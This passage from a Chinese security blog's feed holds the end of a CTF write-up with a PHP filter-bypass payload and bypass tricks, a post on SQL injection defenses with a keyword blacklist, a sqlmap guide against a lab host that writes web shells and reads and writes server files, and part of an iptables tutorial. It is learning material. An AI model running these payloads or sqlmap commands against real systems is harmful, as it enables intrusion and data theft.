class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这段代码主要利用的是if条件里面的eval函数直接输出flag,前提是这里过滤十分强大，把所有可以执行的函数全部过滤，这时候只能利用开发的一个知识，就是<code>&lt;?=$flag?&gt;</code>,可以直接把flag里面的内容直接输出来，这东西我也是在学YII框架的时候学会的。<br>可以直接看一下文档里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</span><br></pre></td></tr></table></figure><p>这相当于说这是一个echo的缩写版<br><a href="https://imgchr.com/i/P2tbjg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2tbjg.md.png" alt="P2tbjg.md.png"></a><br>另外呢这两句话表明了php5.4以后都存在这样的缩写形式<br>我们现在还要考虑的是如何绕过长度的问题以及不要在payload里面存在flag这个词，所以最后的payload是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=$a=&apos;blag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;11111111111111111;&lt;?=$$a;?&gt;</span><br></pre></td></tr></table></figure><p>这里前面的<code>?&gt;</code>的是利用了html里面的嵌套PHP的语法，同时也为了后面的<code>&lt;?=?&gt;</code>可以顺利执行，中间的<code>1</code>就是为了满足<code>strlen</code>这个函数从而执行下面的代码</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.IP地址可以用ip2long这个函数尝试去绕过<br>2.回顾了科学计数法还有这个指数形式在bypass方面的绕过<br>3.parse_url()这个函数的几个小trick，分别是对于特殊字符会替换成_,以及在///的情况下会使后面的东西忽略从而导致绕过<br>4.关于注入这东西，灵活一些，别太死板，除了一些特殊的方法绕过以外，还可以考虑字符集(这里包括16进制)<br>5.eval函数里面的执行文件操作的函数都被过滤了，可以使用缩写输出之类<br>6.正则匹配注意一下匹配\的写法应该是四个|\\|,而且对于正则的规则以^开头$结尾的，可以%0a去bypass<br>7.还有飘零大哥的思路，代码审计拿来可能是SQL注入还有逻辑漏洞这也是很骚气的，22333</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前一阵子关注点在实战上，现在又回归CTF学习套路了，这个网站&lt;a href=&quot;http://solveme.peng.kr&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://solveme.peng.kr&lt;/a&gt; 本来做了一半的题目，今天终于把他补完了，学到了炒鸡多的东西啊
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="代码审计" scheme="0verwatch.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>浅谈SQL注入防御手段</title>
    <link href="0verwatch.top/2018/08/02/sql-inject-protect/"/>
    <id>0verwatch.top/2018/08/02/sql-inject-protect/</id>
    <published>2018-08-02T15:08:29.000Z</published>
    <updated>2018-08-14T14:44:04.855Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sql语句预编译"><a href="#sql语句预编译" class="headerlink" title="sql语句预编译"></a>sql语句预编译</h3><p>例如:<a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"select id, no from user where id=?"</span>;</span><br><span class="line">      PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">      ps.setInt(<span class="number">1</span>, id);</span><br><span class="line">      ps.executeQuery();</span><br></pre></td></tr></table></figure><p>这里采用了<code>PreparedStatement</code>，就会将sql语句<code>预先编译</code>好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的 语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 <code>select ,from ,where ,and, or ,order by</code> 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，只会被当做字符串字面值参数。所以sql语句预编译可以防御sql注入</p><p>讲一下另外一个预编译，就是用PDO，这里就推荐几篇文章自己看一下，简单说一下就是原理跟上面的差不多，把执行语句和变量分开，变量分别绑定，分别传参，从而阻止了注入，只是底层不太明了，自己真菜。。<br><a href="https://segmentfault.com/q/1010000000723496" target="_blank" rel="noopener">https://segmentfault.com/q/1010000000723496</a><br><a href="http://www.cnblogs.com/zl0372/p/php_28.html" target="_blank" rel="noopener">http://www.cnblogs.com/zl0372/p/php_28.html</a><br><a href="https://blog.csdn.net/theVicTory/article/details/62884352" target="_blank" rel="noopener">https://blog.csdn.net/theVicTory/article/details/62884352</a></p><p>预编译方法就最有效！！也是如今市场上最流行的方式了</p><h3 id="检查变量数据类型和格式"><a href="#检查变量数据类型和格式" class="headerlink" title="检查变量数据类型和格式"></a>检查变量数据类型和格式</h3><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid=checkuid($uid);    <span class="comment">//检测$uid是不是数字类型,不是不继续往下运行</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;‘;</span></span><br></pre></td></tr></table></figure><p>这段语句是为了保证了id是数字类型，checkid是一个<code>自定义</code>的函数，但是千万别直接里面写一个<code>is_numeric</code>就结束了啊，这很容易就可以用16进制或者是科学计数法去绕过的，这个还是少用吧，毕竟自写函数就像是写黑名单，肯定会有纰漏的</p><h3 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h3><p>这个方法也相当于<code>黑名单</code>，还是少用为好，一般有纰漏就可以去绕过的了</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> boolean sql_inj(String str) </span><br><span class="line">&#123; </span><br><span class="line">String inj_str = “’|<span class="keyword">and</span>|exec|insert|select|delete|update| </span><br><span class="line">count|*|%|chr|mid|master|truncate|char|<span class="keyword">declare</span>|;|<span class="keyword">or</span>|-|+|,”; </span><br><span class="line">String inj_stra[] = split(inj_str,”|”); </span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span> ; i &lt; inj_stra.length ; i++ ) </span><br><span class="line">&#123; <span class="keyword">if</span> (str.indexOf(inj_stra[i])&gt;=<span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="keyword">true</span>; &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>黑名单只能追求全面去避免SQL注入了</p><h3 id="转译特殊符号"><a href="#转译特殊符号" class="headerlink" title="转译特殊符号"></a>转译特殊符号</h3><p>例如:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;'"</span>;</span><br></pre></td></tr></table></figure></p><p>这里就是利用了<code>addslashes</code>函数去对特殊字符进行转义，比如单引号会被转译成<code>\’</code>，所以无法闭合和注释。不能达到sql注入攻击的效果。一般在CTF题目里面如果我看到这个函数的话，我会预测有75%可能不是SQL注入，先去看看其他点是否存在漏洞</p><h3 id="从中间件配置上防止SQL注入"><a href="#从中间件配置上防止SQL注入" class="headerlink" title="从中间件配置上防止SQL注入"></a>从中间件配置上防止SQL注入</h3><p>通过启用php.ini配置文件中的<code>magic_quote_gpc (魔术字符)</code>，就可以将大部分想利用SQL注入漏洞的骇客拒绝于门外。开启<code>magic_quote_gpc=on</code>之后，能实现<code>addslshes()</code>和<code>stripslashes()</code>这两个函数的功能，这就从很大程度上防止了sql注入。<code>PHP 5.4</code> 之前 PHP 指令 <code>magic_quotes_gpc</code> 默认是 <code>on</code>， 实际上所有的 GET、POST 和 COOKIE 数据都用被 <code>addslashes()</code> 了。 不要对已经被 <code>magic_quotes_gpc</code> 转义过的字符串使用 <code>addslashes()</code>，因为这样会导致<code>双层转义</code>。 遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测<br>但是只开启<code>magic_quote_gpc</code> ，对防止sql注入是远远不够的。<br>例如以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid=&#123;$uid&#125;"</span>;</span><br></pre></td></tr></table></figure><p>在这条sql语句中并没有单引号的保护，攻击者既不需要闭合单引号也不需要注释单引号，所以gpc开启对sql注入攻击的防范并没有作用。所以说变量还是要用引号包住才好，别直接就赋值了。。。</p><h3 id="通过安全waf去防御"><a href="#通过安全waf去防御" class="headerlink" title="通过安全waf去防御"></a>通过安全waf去防御</h3><p>过安全waf达到一定程度防御,软件层面的不多说。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>总的来说，现在很多网站多不会再使用字符串拼接去查找数据库里面的内容了，大多数现在使用的是预编译，除了那些荒废的网站以及CTF题目里面会使用，那是不是说以后挖洞挖SQL注入的就比较难了233333。。。我还是太年轻了</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;sql语句预编译&quot;&gt;&lt;a href=&quot;#sql语句预编译&quot; class=&quot;headerlink&quot; title=&quot;sql语句预编译&quot;&gt;&lt;/a&gt;sql语句预编译&lt;/h3&gt;&lt;p&gt;例如:
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Sqlmap 使用方法小结</title>
    <link href="0verwatch.top/2018/08/02/sqlmap-usage/"/>
    <id>0verwatch.top/2018/08/02/sqlmap-usage/</id>
    <published>2018-08-02T14:05:38.000Z</published>
    <updated>2018-08-02T15:22:31.416Z</updated>
    
    <content type="html"><![CDATA[<p>平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西<a id="more"></a></p><p>前置知识<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">--passwords 数据库密码</span><br><span class="line">--proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒</span><br><span class="line">--threads=                       使用多少线程</span><br></pre></td></tr></table></figure></p><p><code>--is-dba</code> 这个命令有时候决定了你是否可以在服务器下进行写的操作，这个很重要，是否有写的权限，代表你是否可以在服务器上面写入一句话木马</p><h3 id="利用sqlmap进行POST注入"><a href="#利用sqlmap进行POST注入" class="headerlink" title="利用sqlmap进行POST注入"></a>利用sqlmap进行POST注入</h3><p>先利用bp去抓一个包，直接发送包里面的内容保存到一个文件里面，然后用<code>-r</code>参数去实现它就好<br>例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql</span><br><span class="line">```    </span><br><span class="line">指定username参数，-dbms指定了某种数据库，这句话指定的是mysql数据库，-p指定的是参数，不指定的话每一个参数他都会尝试</span><br><span class="line">注意这句话已经不像平常那样需要`-u`参数了，直接`-r`参数即可，因为报文里面已经含有了含有应有的各种条件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 利用sqlmap进行需要登陆的注入</span><br><span class="line">可以跟上面进行post注入的一样，直接`-r`参数带上你的抓包文件路径，既然是需要登录的注入，那么报文里面肯定是要有`cookie`的</span><br><span class="line">我们还可以利用<span class="comment">--cookie参数注入，例如: </span></span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp; Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --current-db</span></span><br></pre></td></tr></table></figure><p>这里面的cookie参数可以抓包获得</p><h3 id="利用sqlmap进行交互式写shell"><a href="#利用sqlmap进行交互式写shell" class="headerlink" title="利用sqlmap进行交互式写shell"></a>利用sqlmap进行交互式写shell</h3><p>这个要利用sqlmap写shell的话前提需要获取网站的绝对路径，而且必须叙是root权限</p><p>使用burpsuite进行抓包，获取cookie。判断用户是否为dba，输入命令：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --is-dba</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g9pT.png" alt="P0g9pT.png"></p><p>  输入命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --os-shell</span></span><br></pre></td></tr></table></figure><p>  脚本类型为PHP，所以输入4<br><img src="https://s1.ax1x.com/2018/08/02/P0gC1U.png" alt="P0gC1U.png">     </p><p>   输入第二步得到的路径，这样就可以在里面写相关命令了<br><img src="https://s1.ax1x.com/2018/08/02/P0gknJ.png" alt="P0gknJ.png"></p><p><img src="https://s1.ax1x.com/2018/08/02/P0gu9K.png" alt="P0gu9K.png"><br>这时候会在绝对路径下写入2个shell，一个用来执行命令的，另一个是用来上传的，其中上传的文件名为tmpujhum.php，这个上传的文件可以去上传小马然后连接即可，这里我们注意一下，为什么会出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志，后面也会提一下。他这个写进admin的方式有可能会导致利用sqlmap写文件的时候小马文件会出现乱码。猜测是写文件的方式导致了文件的乱码，我们都知道写文件的方式要么就是ASCII要么是二进制文件流方式去实现。</p><h3 id="利用sqlmap辅助手工注入"><a href="#利用sqlmap辅助手工注入" class="headerlink" title="利用sqlmap辅助手工注入"></a>利用sqlmap辅助手工注入</h3><p>其实这个就是介绍了在发现注入点之后，怎么在sqlmap里面执行SQL语句，继续用上面的例子，改一下就是这样子的，但前提我们也是要发现数据点<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --sql-query "select user(),version(),database()"</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g3Bd.png" alt="P0g3Bd.png"><br>这样就是相当于运行对应的SQL语句了。但是其实这样执行的话每一次都会对网站注入一遍，效率就比较低.<br>可以换一个方式，把<code>--sql-query</code>改为<code>--sql-shell</code>,这样一来就相当于平常我们执行SQL语句的那个cmd命令界面一样。写一条语句就直接执行一条，省去了注入的过程。</p><h3 id="利用sqlmap进行文件读写"><a href="#利用sqlmap进行文件读写" class="headerlink" title="利用sqlmap进行文件读写"></a>利用sqlmap进行文件读写</h3><p>这里可以写文件的话前提必须有<br>判断是否为<code>dba/root用户</code>，爆出了网站的绝对路径，有一个可写目录，也是用上面的案例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-read=/opt/lampp/htdocs/php.ini</span></span><br></pre></td></tr></table></figure><p>成功读取了<code>php.ini</code>文件，并返回了路径。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0g8HA.png" alt="P0g8HA.png"><br> 打开如下图所示：<br>      这里的文件我们可以去sqlmap的output里面查看，也就是对应的用户文件夹里面</p><p>在服务器端写入文件<br>      输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-write C:\1.txt --file-dest /opt/lampp/htdocs/vulnerabilities/exec/1.txt</span></span><br></pre></td></tr></table></figure><p>  这里的意思就是将本地<code>C:\1.txt</code> 写入到服务器端<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p><p>打开对应文件的网站路径如下图：<br><img src="https://s1.ax1x.com/2018/08/02/P0gJAI.png" alt="P0gJAI.png">      </p><p>这里又出现了admin admin了，就是sqlmap用来确认是否写成功的标志，因为在写文件的过程中他会问是否验证，它就会以这个标志来判断啦。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0gYNt.png" alt="P0gYNt.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Linux防火墙学习</title>
    <link href="0verwatch.top/2018/07/29/Linux-FW/"/>
    <id>0verwatch.top/2018/07/29/Linux-FW/</id>
    <published>2018-07-29T15:32:03.000Z</published>
    <updated>2018-08-05T11:54:35.604Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux下<code>iptables</code>的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，<a id="more"></a>现在我要更正一下自己的思路，路由器不单单实现转发功能，我现在还把他看成一台可以实现过滤功能的电脑，这样就对它所连接的LAN有保护作用了，但现在一般对于网络防火墙而言很少再使用<code>iptables</code>了，现在一般都用一些大型厂商提供的防火墙。比如华3，深信服之类的，说白了就是牛逼了一点的电脑，但是对于一台服务器而言还是可以设置规则来防止别人拿下服务器的。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>netfilter</code>    ：位于Linux内核中的包过滤功能体系，称为Linux防火墙的“内核态”<br><code>iptables</code>：位于/sbin/iptables，用来管理防火墙规则的工具，称为Linux防火墙的“用户态”</p><p>—— 上述2种称呼都可以表示Linux防火墙<br>其实用户层面使用iptables也是去调用内核里面的netfilter，这是操作系统里面的知识就不多说了</p><h3 id="Linux查看防火墙状态"><a href="#Linux查看防火墙状态" class="headerlink" title="Linux查看防火墙状态"></a>Linux查看防火墙状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables start 启动防火墙</span><br><span class="line">service iptables status 查看防火墙状态，还可以使用这样一条命令iptables -L --line-numbers查看较为详细的命令</span><br><span class="line">service iptables stop 停止服务</span><br></pre></td></tr></table></figure><p>如果是阿里云的主机好像没有这个服务，他是直接在网页上让你设置防火墙，这是我自己的阿里云主机，命令行界面不能设置，但是在网页端可已自行控制端口的开放以及各种规则<br><img src="https://s1.ax1x.com/2018/07/29/Pa5y1f.png" alt="Pa5y1f.png"></p><p><a href="https://imgchr.com/i/Pa5vNR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/Pa5vNR.md.png" alt="Pa5vNR.md.png"></a></p><h3 id="包过滤的工作层次"><a href="#包过滤的工作层次" class="headerlink" title="包过滤的工作层次"></a>包过滤的工作层次</h3><p>主要实现在网络层也就是对IP数据包的处理上，详细一点就是对ip地址以及端口做处理<br><a href="https://imgchr.com/i/PaI8Ej" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaI8Ej.md.png" alt="PaI8Ej.md.png"></a></p><p>下面是些先行知识，关于iptables的链表结构</p><h3 id="规则链"><a href="#规则链" class="headerlink" title="规则链"></a>规则链</h3><p>规则的作用：对数据包进行过滤或处理<br>链的作用：容纳各种防火墙规则<br>链的分类依据：处理数据包的不同时机</p><p>默认包括5种规则链<br><code>INPUT</code>：处理入站数据包<br><code>OUTPUT</code>：处理出站数据包<br><code>FORWARD</code>：处理转发数据包<br><code>POSTROUTING</code>链：在进行路由选择后处理数据包<br><code>PREROUTING</code>链：在进行路由选择前处理数据包</p><p>上面这5种规则，在现实生活中一般不是全都是使用</p><h3 id="规则表"><a href="#规则表" class="headerlink" title="规则表"></a>规则表</h3><p>表的作用：容纳各种规则链<br>表的划分依据：防火墙规则的作用相似</p><p>默认包括4个规则表<br><code>raw</code>表：确定是否对该数据包进行状态跟踪<br><code>mangle</code>表：为数据包设置标记<br><code>nat</code>表：修改数据包中的源、目标IP地址或端口<br><code>filter</code>表：确定是否放行该数据包（过滤）<br>常用的就是其中<strong>filter</strong>表<strong>nat</strong>表多用于实现ip的转化功能，这里的表功能个人感觉相当于链下面的表功能，每种链都存在这四种表</p><h3 id="规则表之间的默认优先级"><a href="#规则表之间的默认优先级" class="headerlink" title="规则表之间的默认优先级"></a>规则表之间的默认优先级</h3><p><code>raw&gt;mangle&gt;nat&gt;filter</code><br>规则链之间的默认优先级<br>入站：<code>PREROUTING&gt;INPUT</code><br>出站：<code>OUTPUT&gt;POSTROUTING</code><br>转发：<code>PREROUTING&gt;FORWARD&gt;POSTROUTING</code><br>规则链内的匹配顺序<br>按顺序依次检查，匹配即停止（LOG策略例外）<br>若找不到相匹配的规则，则按该链的默认策略处理，这跟路由转发还是有点区别的<br><a href="https://imgchr.com/i/PaIBb4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaIBb4.md.png" alt="PaIBb4.md.png"></a></p><p>整个基本流程大概就是这样，反正吧现在的网络环境一般都是只需要其中的一部分</p><h3 id="命令实现"><a href="#命令实现" class="headerlink" title="命令实现"></a>命令实现</h3><p>基本格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables  [-t 表名]  选项  [链名]  [条件]  [-j 控制类型]</span><br></pre></td></tr></table></figure><p>几个<code>注意事项</code><br>不指定表名时，默认指filter表<br>不指定链名时，默认指表内的所有链<br>除非设置链的默认策略，否则必须指定匹配条件<br>选项、链名、控制类型使用大写字母，其余均为小写</p><p>数据包的常见控制类型<br><code>ACCEPT</code>：允许通过<br><code>DROP</code>：直接丢弃，不给出任何回应<br><code>REJECT</code>：拒绝通过，必要时会给出提示<br><code>LOG</code>：记录日志信息，然后传给下一条规则继续匹配</p><p>添加新的规则,这里考虑到他的匹配规则必要的时候需要换一下命令<br><code>-A</code>：在链的末尾追加一条规则<br><code>-I</code>：在链的开头（或指定序号）插入一条规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -A INPUT -p tcp -j ACCEPT   直接在最后加入规则</span><br><span class="line">iptables -I INPUT 2 -p icmp -j ACCEPT 这样就是在第二条后面插入规则</span><br></pre></td></tr></table></figure><p>删除、清空规则<br><code>-D</code>：删除链内指定序号（或内容）的一条规则<br><code>-F</code>：清空所有的规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> iptables -F  清空所有规则</span><br><span class="line">iptables -D INPUT 3  删除第三条规则</span><br></pre></td></tr></table></figure><p>设置默认策略<br><code>-P</code>：为指定的链设置默认规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -P FORWARD DROP  给FORWARD链默认设置DROP规则</span><br></pre></td></tr></table></figure><p>协议匹配：<code>-p</code> 协议名<br>地址匹配：<code>-s</code> 源地址、<code>-d</code> 目的地址<br>接口匹配：<code>-i</code> 入站网卡、<code>-o</code> 出站网卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -p ! icmp -j ACCEPT  这条命令的意思就是除了icmp协议之外的所有协议都ACCEPT</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s 10.20.30.0/24 -j DROP  这条命令的意思就是把来自10.20.30.0这一个网段的包全都丢掉，有效防止了DDOS攻击</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP </span><br><span class="line">iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP</span><br><span class="line">iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP</span><br></pre></td></tr></table></figure><p>上面这三条命令也很有实际意义，假设有人恶意串改了源地址，同时把这个包发送到内网，内网的机子会对这种包做出响应，此时源地址变成目的地址，就会直接在内网里面一个个尝试对应IP从而可以攻击内网的机子，因为这种源IP是内网地址的是不可能出现在互联网上的，理所当然应该禁止</p><p>端口匹配：<code>--sport</code>源端口、<code>--dport</code> 目的端口<br>TCP标记匹配：<code>--tcp-flags</code> 检查范围 被设置的标记<br>ICMP类型匹配：<code>--icmp-type</code> ICMP类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -s 192.168.4.0/24 -p udp --dport 53 -j ACCEPT   对于192.168.4.0这个网段的DNS服务开启做相应规则</span><br><span class="line">iptables -A INPUT -p tcp --dport 20:21 -j ACCEPT 禁止FTP</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -j DROP</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 3 -j ACCEPT</span><br></pre></td></tr></table></figure><p>这就是我前面讲的对应自己ping别人可收到响应报文，别人却ping不到你，有效降低你被别人攻击的可能</p><p>再来看看一个例子<br>输入命令<code>iptables -t filter -I INPUT -p icmp -j REJECTED</code><br>这条命令是对进入的数据包进行icmp所有协议包进行过滤，需要注意两点第一，控制类型不一样返回的效果也不一样，第二对于icmp这种类型的报文而言，响应包跟请求包都被截了，后面会讲到如何可以接受icmp响应包而不接受请求包<br>然后尝试ping一下对面的机子，这是拒绝(REJECT)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIsa9.png" alt="PaIsa9.png"></p><p>这是直接丢弃(DROP)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIy5R.png" alt="PaIy5R.png"></p><h2 id="结语"><a href="#结语" class="headerlink" 